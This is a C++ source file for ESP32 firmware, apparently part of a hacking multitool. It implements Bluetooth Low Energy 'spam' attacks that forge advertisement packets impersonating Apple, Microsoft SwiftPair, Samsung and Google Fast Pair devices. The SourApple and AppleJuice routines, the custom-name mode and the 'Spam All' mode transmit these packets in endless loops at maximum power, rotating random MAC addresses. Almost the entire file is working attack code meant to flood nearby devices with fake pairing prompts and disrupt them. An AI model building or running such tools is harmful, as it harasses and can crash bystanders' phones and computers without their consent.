#include "ble_spam.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#ifdef CONFIG_BT_NIMBLE_ENABLED
#if __has_include(<NimBLEExtAdvertising.h>)
#define NIMBLE_V2_PLUS 1
#endif
#include "esp_mac.h"
#elif defined(CONFIG_BT_BLUEDROID_ENABLED)
#include "esp_gap_ble_api.h"
#endif
#include <globals.h>
#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
#define MAX_TX_POWER ESP_PWR_LVL_P21
#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6) || defined(CONFIG_IDF_TARGET_ESP32C5)
#define MAX_TX_POWER ESP_PWR_LVL_P20
#else
#define MAX_TX_POWER ESP_PWR_LVL_P9
#endif

struct BLEData {
    BLEAdvertisementData AdvData;
    BLEAdvertisementData ScanData;
};

struct WatchModel {
    uint8_t value;
};

struct mac_addr {
    unsigned char bytes[6];
};

struct Station {
    uint8_t mac[6];
    bool selected;
};

enum EBLEPayloadType { Microsoft, SourApple, AppleJuice, Samsung, Google };

const uint8_t IOS1[] = {
    0x02, 0x0e, 0x0a, 0x0f, 0x13, 0x14, 0x03, 0x0b,
    0x0c, 0x11, 0x10, 0x05, 0x06, 0x09, 0x17, 0x12,
    0x16
};

const uint8_t IOS2[] = {
    0x01, 0x06, 0x20, 0x2b, 0xc0, 0x0d, 0x13, 0x27,
    0x0b, 0x09, 0x02, 0x1e, 0x24
};

uint8_t *data;
int deviceType = 0;

struct DeviceType {
    uint32_t value;
};

const DeviceType android_models[] = {
    {0x0001F0}, {0x000047}, {0x470000}, {0x00000A},
    {0x00000B}, {0x00000D}, {0x000007}, {0x090000},
    {0x000048}, {0x001000}, {0x00B727}, {0x01E5CE},
    {0x0200F0}, {0x00F7D4}, {0xF00002}, {0xF00400},
    {0x1E89A7}, {0xCD8256}, {0x0000F0}, {0xF00000},
    {0x821F66}, {0xF52494}, {0x718FA4}, {0x0002F0},
    {0x92BBBD}, {0x000006}, {0x060000}, {0xD446A7},
    {0x038B91}, {0x02F637}, {0x02D886}, {0xF00000},
    {0xF00001}, {0xF00201}, {0xF00209}, {0xF00205},
    {0xF00305}, {0xF00E97}, {0x04ACFC}, {0x04AA91},
    {0x04AFB8}, {0x05A963}, {0x05AA91}, {0x05C452},
    {0x05C95C}, {0x0602F0}, {0x0603F0}, {0x1E8B18},
    {0x1E955B}, {0x06AE20}, {0x06C197}, {0x06C95C},
    {0x06D8FC}, {0x0744B6}, {0x07A41C}, {0x07C95C},
    {0x07F426}, {0x054B2D}, {0x0660D7}, {0x0903F0},
    {0xD99CA1}, {0x77FF67}, {0xAA187F}, {0xDCE9EA},
    {0x87B25F}, {0x1448C9}, {0x13B39D}, {0x7C6CDB},
    {0x005EF9}, {0xE2106F}, {0xB37A62}, {0x92ADC9}
};

const WatchModel watch_models[] = {
    {0x1A}, {0x01}, {0x02}, {0x03}, {0x04},
    {0x05}, {0x06}, {0x07}, {0x08}, {0x09},
    {0x0A}, {0x0B}, {0x0C}, {0x11}, {0x12},
    {0x13}, {0x14}, {0x15}, {0x16}, {0x17},
    {0x18}, {0x1B}, {0x1C}, {0x1D}, {0x1E},
    {0x20},
    {0x43}, {0x44}, {0x45}, {0x46}, {0x47},
    {0x48}, {0x49}, {0x4A}, {0x4B}, {0x4C},
    {0x4D}, {0x4E}, {0x4F}, {0x50}, {0x51},
    {0x52}, {0x53}, {0x54}, {0x55}, {0x56},
    {0x57}, {0x58}, {0x59}, {0x5A}, {0x5B},
    {0x5C}, {0x5D}
};

char randomNameBuffer[32];

const char *generateRandomName() {
    const char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    int len = rand() % 10 + 1;
    if (len > 31) len = 31;
    for (int i = 0; i < len; ++i) {
        randomNameBuffer[i] = charset[rand() % strlen(charset)];
    }
    randomNameBuffer[len] = '\0';
    return randomNameBuffer;
}

void generateRandomMac(uint8_t *mac) {
    esp_fill_random(mac, 6);
    mac[0] = (mac[0] & 0xFE) | 0x02;
}

int android_models_count = (sizeof(android_models) / sizeof(android_models[0]));
int watch_models_count = (sizeof(watch_models) / sizeof(watch_models[0]));

BLEAdvertising *pAdvertising;

BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
    BLEAdvertisementData AdvData = BLEAdvertisementData();
    uint8_t *AdvData_Raw = nullptr;
    uint8_t i = 0;

    switch (Type) {
        case Microsoft: {
            const char *Name = generateRandomName();
            uint8_t name_len = strlen(Name);
            AdvData_Raw = new uint8_t[7 + name_len];
            AdvData_Raw[i++] = 6 + name_len;
            AdvData_Raw[i++] = 0xFF;
            AdvData_Raw[i++] = 0x06;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x03;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x80;
            memcpy(&AdvData_Raw[i], Name, name_len);
            i += name_len;
#ifdef NIMBLE_V2_PLUS
            AdvData.addData(AdvData_Raw, 7 + name_len);
#else
            std::vector<uint8_t> dataVector(AdvData_Raw, AdvData_Raw + 7 + name_len);
            AdvData.addData(dataVector);
#endif
            delete[] AdvData_Raw;
            break;
        }
        case AppleJuice: {
            int rand_val = random(2);
            if (rand_val == 0) {
                uint8_t packet[26] = {
                    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07,
                    IOS1[random() % sizeof(IOS1)],
                    0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                    0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00
                };
#ifdef NIMBLE_V2_PLUS
                AdvData.addData(packet, 26);
#else
                std::vector<uint8_t> dataVector(packet, packet + 26);
                AdvData.addData(dataVector);
#endif
            } else if (rand_val == 1) {
                uint8_t packet[23] = {
                    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a,
                    0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1,
                    IOS2[random() % sizeof(IOS2)],
                    0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00,
                    0x00, 0x00
                };
#ifdef NIMBLE_V2_PLUS
                AdvData.addData(packet, 23);
#else
                std::vector<uint8_t> dataVector(packet, packet + 23);
                AdvData.addData(dataVector);
#endif
            }
            break;
        }
        case SourApple: {
            uint8_t packet[17];
            uint8_t j = 0;
            packet[j++] = 16;
            packet[j++] = 0xFF;
            packet[j++] = 0x4C;
            packet[j++] = 0x00;
            packet[j++] = 0x0F;
            packet[j++] = 0x05;
            packet[j++] = 0xC1;
            const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
            packet[j++] = types[random() % sizeof(types)];
            esp_fill_random(&packet[j], 3);
            j += 3;
            packet[j++] = 0x00;
            packet[j++] = 0x00;
            packet[j++] = 0x10;
            esp_fill_random(&packet[j], 3);
#ifdef NIMBLE_V2_PLUS
            AdvData.addData(packet, 17);
#else
            std::vector<uint8_t> dataVector(packet, packet + 17);
            AdvData.addData(dataVector);
#endif
            break;
        }
        case Samsung: {
            uint8_t model = watch_models[random(watch_models_count)].value;
            uint8_t Samsung_Data[15] = {
                0x0F, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02,
                0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43,
                (uint8_t)((model >> 0x00) & 0xFF)
            };
#ifdef NIMBLE_V2_PLUS
            AdvData.addData(Samsung_Data, 15);
#else
            std::vector<uint8_t> dataVector(Samsung_Data, Samsung_Data + 15);
            AdvData.addData(dataVector);
#endif
            break;
        }
        case Google: {
            const uint32_t model = android_models[rand() % android_models_count].value;
            uint8_t Google_Data[14] = {
                0x03, 0x03, 0x2C, 0xFE, 0x06, 0x16, 0x2C,
                0xFE, (uint8_t)((model >> 0x10) & 0xFF),
                (uint8_t)((model >> 0x08) & 0xFF),
                (uint8_t)((model >> 0x00) & 0xFF),
                0x02, 0x0A, (uint8_t)((rand() % 120) - 100)
            };
#ifdef NIMBLE_V2_PLUS
            AdvData.addData(Google_Data, 14);
#else
            std::vector<uint8_t> dataVector(Google_Data, Google_Data + 14);
            AdvData.addData(dataVector);
#endif
            break;
        }
        default: {
            Serial.println("Please Provide a Company Type");
            break;
        }
    }

    return AdvData;
}

void executeSpam(EBLEPayloadType type) {
    uint8_t macAddr[6];
    generateRandomMac(macAddr);
    esp_iface_mac_addr_set(macAddr, ESP_MAC_BT);

    BLEDevice::init("");
    vTaskDelay(50 / portTICK_PERIOD_MS);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
    pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type);
    BLEAdvertisementData oScanResponseData = BLEAdvertisementData();

    advertisementData.setFlags(0x06);

    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->setScanResponseData(oScanResponseData);
    pAdvertising->setMinInterval(32);
    pAdvertising->setMaxInterval(48);
    pAdvertising->start();
    vTaskDelay(250 / portTICK_PERIOD_MS);

    pAdvertising->stop();
    vTaskDelay(50 / portTICK_PERIOD_MS);
#if defined(CONFIG_IDF_TARGET_ESP32C5)
    esp_bt_controller_deinit();
#else
    BLEDevice::deinit();
#endif
}

void executeCustomSpam(String spamName) {
    uint8_t macAddr[6];
    for (int i = 0; i < 6; i++) { macAddr[i] = esp_random() & 0xFF; }
    macAddr[0] = (macAddr[0] | 0xF0) & 0xFE;
    esp_iface_mac_addr_set(macAddr, ESP_MAC_BT);

    BLEDevice::init("sh4rk");
    vTaskDelay(5 / portTICK_PERIOD_MS);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
    pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData advertisementData = BLEAdvertisementData();

    advertisementData.setFlags(0x06);
    advertisementData.setName(spamName.c_str());
    pAdvertising->addServiceUUID(BLEUUID("1812"));
    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->start();
    vTaskDelay(20 / portTICK_PERIOD_MS);
    pAdvertising->stop();
    vTaskDelay(10 / portTICK_PERIOD_MS);
#if defined(CONFIG_IDF_TARGET_ESP32C5)
    esp_bt_controller_deinit();
#else
    BLEDevice::deinit();
#endif
}

void ibeacon(const char *DeviceName, const char *BEACON_UUID, int ManufacturerId) {
    uint8_t macAddr[6];
    generateRandomMac(macAddr);
    esp_iface_mac_addr_set(macAddr, ESP_MAC_BT);

    BLEDevice::init(DeviceName);
    vTaskDelay(5 / portTICK_PERIOD_MS);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);

    NimBLEBeacon myBeacon;
    myBeacon.setManufacturerId(0x4c00);
    myBeacon.setMajor(5);
    myBeacon.setMinor(88);
    myBeacon.setSignalPower(0xc5);
    myBeacon.setProximityUUID(BLEUUID(BEACON_UUID));

    pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData advertisementData = BLEAdvertisementData();
    advertisementData.setFlags(0x1A);
    advertisementData.setManufacturerData(myBeacon.getData());
    pAdvertising->setAdvertisementData(advertisementData);

    drawMainBorderWithTitle("iBeacon");
    padprintln("");
    padprintln("UUID:" + String(BEACON_UUID));
    padprintln("");
    padprintln("Press Any key to STOP.");

    while (!check(AnyKeyPress)) {
        pAdvertising->start();
        Serial.println("Advertizing started...");
        vTaskDelay(20 / portTICK_PERIOD_MS);
        pAdvertising->stop();
        vTaskDelay(10 / portTICK_PERIOD_MS);
        Serial.println("Advertizing stop");
    }

#if defined(CONFIG_IDF_TARGET_ESP32C5)
    esp_bt_controller_deinit();
#else
    BLEDevice::deinit();
#endif
}

void aj_adv(int ble_choice) {
    int count = 0;
    String spamName = "";
    if (ble_choice == 6) { spamName = keyboard("", 10, "Name to spam"); }

    if (ble_choice == 5) {
        displayTextLine("Spam All Sequential");
        padprintln("");
        padprintln("Press ESC to stop");

        while (1) {
            if (check(EscPress)) {
                returnToMenu = true;
                break;
            }

            int protocol = count % 7;

            switch(protocol) {
                case 0:
                    displayTextLine("Android " + String(count));
                    executeSpam(Google);
                    break;
                case 1:
                    displayTextLine("Samsung " + String(count));
                    executeSpam(Samsung);
                    break;
                case 2:
                    displayTextLine("Windows " + String(count));
                    executeSpam(Microsoft);
                    break;
                case 3:
                    displayTextLine("AppleTV " + String(count));
                    quickAppleSpam(10);
                    break;
                case 4:
                    displayTextLine("AirPods " + String(count));
                    quickAppleSpam(0);
                    break;
                case 5:
                    displayTextLine("SourApple " + String(count));
                    executeSpam(SourApple);
                    break;
                case 6:
                    displayTextLine("AppleJuice " + String(count));
                    executeSpam(AppleJuice);
                    break;
            }

            count++;

            if (check(EscPress)) {
                returnToMenu = true;
                break;
            }
        }

        BLEDevice::init("");
        vTaskDelay(100 / portTICK_PERIOD_MS);
        pAdvertising = nullptr;
        vTaskDelay(100 / portTICK_PERIOD_MS);
#if defined(CONFIG_IDF_TARGET_ESP32C5)
        esp_bt_controller_deinit();
#else
        BLEDevice::deinit();
#endif
        return;
    }

    while (1) {
        switch (ble_choice) {
            case 0:
                startAppleSpam(0);
                return;
            case 1:
                startAppleSpam(10);
                return;
            case 2:
                displayTextLine("SwiftPair  (" + String(count) + ")");
                executeSpam(Microsoft);
                break;
            case 3:
                displayTextLine("Samsung  (" + String(count) + ")");
                executeSpam(Samsung);
                break;
            case 4:
                displayTextLine("Android  (" + String(count) + ")");
                executeSpam(Google);
                break;
            case 6:
                displayTextLine("Spamming " + spamName + "(" + String(count) + ")");
                executeCustomSpam(spamName);
                break;
            case 7:
                displayTextLine("SourApple " + String(count));
                executeSpam(SourApple);
                break;
            case 8:
                displayTextLine("AppleJuice " + String(count));
                executeSpam(AppleJuice);
                break;
        }
        count++;

        if (check(EscPress)) {
            returnToMenu = true;
            break;
        }
    }
    BLEDevice::init("");
    vTaskDelay(100 / portTICK_PERIOD_MS);
    pAdvertising = nullptr;
    vTaskDelay(100 / portTICK_PERIOD_MS);
#if defined(CONFIG_IDF_TARGET_ESP32C5)
    esp_bt_controller_deinit();
#else
    BLEDevice::deinit();
#endif
}

void legacySubMenu() {
    std::vector<Option> legacyOptions;
    legacyOptions.push_back({"SourApple", []() { aj_adv(7); }});
    legacyOptions.push_back({"AppleJuice", []() { aj_adv(8); }});
    legacyOptions.push_back({"Back", []() { returnToMenu = true; }});
    loopOptions(legacyOptions, MENU_TYPE_SUBMENU, "Apple Spam (Legacy)");
}

void spamMenu() {
    std::vector<Option> options;
    options.push_back({"Apple Spam", [=]() { appleSubMenu(); }});
    options.push_back({"Apple Spam (Legacy)", [=]() { legacySubMenu(); }});
    options.push_back({"Windows Spam", lambdaHelper(aj_adv, 2)});
    options.push_back({"Samsung Spam", lambdaHelper(aj_adv, 3)});
    options.push_back({"Android Spam", lambdaHelper(aj_adv, 4)});
    options.push_back({"Spam All", lambdaHelper(aj_adv, 5)});
    options.push_back({"Spam Custom", lambdaHelper(aj_adv, 6)});
    options.push_back({"Back", []() { returnToMenu = true; }});
    loopOptions(options, MENU_TYPE_SUBMENU, "Bluetooth Spam");
}
